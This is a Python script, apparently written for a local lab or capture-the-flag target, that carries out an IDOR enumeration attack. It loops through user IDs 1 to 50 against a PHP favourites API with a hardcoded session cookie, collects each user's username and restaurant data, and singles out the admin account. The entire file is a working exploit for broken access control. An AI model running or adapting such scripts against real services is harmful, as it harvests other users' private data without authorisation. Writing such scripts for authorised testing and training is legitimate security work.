import requests
import json

def enumerate_user_ids():
    base_url = "http://127.0.0.1:32825/api/get_favorite_restaurants.php"
    
    # Use the session cookie from auth state
    cookies = {
        'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'
    }
    
    valid_users = []
    users_with_data = []
    users_without_data = []
    not_found_users = []
    error_users = []
    admin_user = None
    
    print(f"[IDOR Enumeration] Testing user IDs 1-50 against {base_url}")
    print("=" * 80)
    print()
    
    for user_id in range(1, 51):
        url = f"{base_url}?userId={user_id}"
        
        try:
            response = requests.get(url, cookies=cookies, timeout=10)
            
            # Check for HTTP 200 with JSON data
            if response.status_code == 200:
                try:
                    json_data = response.json()
                    valid_users.append(user_id)
                    
                    # Extract username and restaurants
                    username = "N/A"
                    restaurants = []
                    
                    # Handle different JSON structures
                    if isinstance(json_data, dict):
                        if 'username' in json_data:
                            username = json_data['username']
                            restaurants = json_data.get('restaurants', [])
                        elif 'data' in json_data and isinstance(json_data['data'], dict):
                            data = json_data['data']
                            username = data.get('username', 'N/A')
                            restaurants = data.get('restaurants', [])
                    
                    # Check for admin user (userId=7)
                    if user_id == 7 and username == "admin":
                        admin_user = {
                            'user_id': user_id,
                            'username': username,
                            'restaurants': restaurants,
                            'full_data': json_data
                        }
                    
                    # Categorize users
                    if restaurants and len(restaurants) > 0:
                        users_with_data.append(user_id)
                    else:
                        users_without_data.append(user_id)
                    
                    print(f"[USER {user_id}] Status: 200 | Username: {username}")
                    if restaurants:
                        print(f"  Restaurants: {len(restaurants)} - {restaurants}")
                    else:
                        print(f"  Restaurants: None")
                    print()
                    
                except json.JSONDecodeError:
                    error_users.append(user_id)
                    print(f"[USER {user_id}] Status: 200 but NOT JSON")
                    print(f"  Response: {response.text[:100]}...")
                    print()
                    
            elif response.status_code == 404:
                not_found_users.append(user_id)
                print(f"[USER {user_id}] Status: 404 - Not Found")
                print()
                
            else:
                error_users.append(user_id)
                print(f"[USER {user_id}] Status: {response.status_code} - Unexpected")
                print(f"  Response: {response.text[:100]}...")
                print()
                
        except requests.exceptions.RequestException as e:
            error_users.append(user_id)
            print(f"[USER {user_id}] REQUEST ERROR: {str(e)}")
            print()
    
    print()
    print("=" * 80)
    print("[FINAL SUMMARY]")
    print("=" * 80)
    print(f"Total valid users found: {len(valid_users)}")
    print(f"  Users with restaurant data: {len(users_with_data)}")
    print(f"  Users without restaurant data: {len(users_without_data)}")
    print(f"Users not found (404): {len(not_found_users)}")
    print(f"Users with errors: {len(error_users)}")
    print()
    print(f"Users with data: {sorted(users_with_data)}")
    print(f"Users without data: {sorted(users_without_data)}")
    if not_found_users:
        print(f"Users not found: {sorted(not_found_users)}")
    print()
    
    # Admin confirmation
    if admin_user:
        print("[ADMIN CONFIRMATION]")
        print(f"  userId=7 = '{admin_user['username']}'")
        print(f"  Restaurants: {admin_user['restaurants']}")
        print(f"  Full response:")
        print(f"  {json.dumps(admin_user['full_data'], indent=4)}")
        print()
    else:
        print("[ADMIN NOT FOUND] userId=7 does not exist or is not admin")
        print()
    
    print("Detailed user breakdown:")
    for uid in sorted(valid_users):
        status = "✓ data" if uid in users_with_data else "✗ no data"
        admin_marker = " [ADMIN]" if uid == 7 else ""
        print(f"  User {uid}: {status}{admin_marker}")
    
    print()
    print("=" * 80)

if __name__ == "__main__":
    enumerate_user_ids()
